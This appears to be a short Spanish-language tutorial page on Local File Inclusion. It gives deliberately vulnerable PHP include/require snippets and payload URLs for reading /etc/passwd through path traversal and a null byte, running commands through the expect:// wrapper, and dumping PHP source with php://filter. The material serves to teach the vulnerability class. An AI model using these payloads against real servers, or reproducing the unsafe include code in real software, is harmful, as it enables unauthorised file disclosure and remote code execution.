---
title: Local File Inclusion (LFI)
published: true
---

La vulnerabilidad 'Local File Inclusion' permite a un atacante leer un archivo del servidor vulnerable, se produce debido a un error de programación de la página.

Dependiendo de la importancia, esta vulnerabilidad puede llevar al atacante a:
	
* RCE (Remote Code Execution)
* XSS (Cross-Site Scripting)
* DoS (Denial Of Service)

Un ejemplo muy básico sería el siguiente script de php:

```php
<?php
	$file = $_GET['filename'];
	include($file);
?>
```

```
https://localhost/lfi.php?filename=/etc/passwd
```

Esto no es solo una vulnerabilidad de php, también está presente en otros lenguajes como jsp, asp entre otros.

### [](#header-3)Directory Path Traversal

```php
<?php
	$file = $_GET['filename'];
	include("/var/www/html/" . $file);
?>
```

Solo podemos listar el contenido de la ruta especificada; sin embargo, si añadimos '../', podremos listar contenido más allá de '/var/www/html/'.

```
https://localhost/lfi.php?filename=../../../etc/passwd
```

### [](#header-3)Null Byte

```php
<?php
	$file = $_GET['filename'];
        require($file . ".php");
?>
```

El '.php' se añade al nombre del archivo; sin embargo, si añadimos el nullbyte al final de nuestra cadena de ataque, el '.php' no será tenido en cuenta. 

```
https://localhost/lfi.php?filename=/etc/passwd%00
```

### [](#header-3)Wrappers

#### [](#header-4)expect://

Ejecutar comandos.

```
https://localhost/lfi.php?filename=expect://whoami
```

#### [](#header-4)filter://

Leer php.

```
https://localhost/lfi.php?filename=php://filter/convert.base64-encode/resource=test.php
```
